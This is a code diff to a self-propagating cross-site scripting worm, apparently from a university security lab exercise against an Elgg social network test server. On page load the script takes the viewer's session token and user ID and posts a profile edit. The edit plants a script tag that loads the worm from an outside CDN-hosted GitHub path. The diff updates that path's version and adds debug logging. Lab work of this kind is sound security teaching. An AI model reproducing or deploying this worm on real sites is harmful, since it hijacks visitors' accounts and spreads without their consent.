@@ -6,9 +6,10 @@ window.onload = function(){
 	var guid="&guid="+elgg.session.user.guid;
   	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
   	var token="&__elgg_token="+elgg.security.token.__elgg_token;
-	
+	console.log("1");
 	//Construct the content of your url.
-	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V5\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
+	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V6\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
+	console.log("2");
 	var content = ts + token + userName + description + guid;
 	var samyGuid = 59;
 	var sendurl = "http://www.seed-server.com/action/profile/edit";
@@ -22,6 +23,7 @@ window.onload = function(){
 		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 		Ajax.send(content);
 	}
+		console.log("3");
 }
 
 
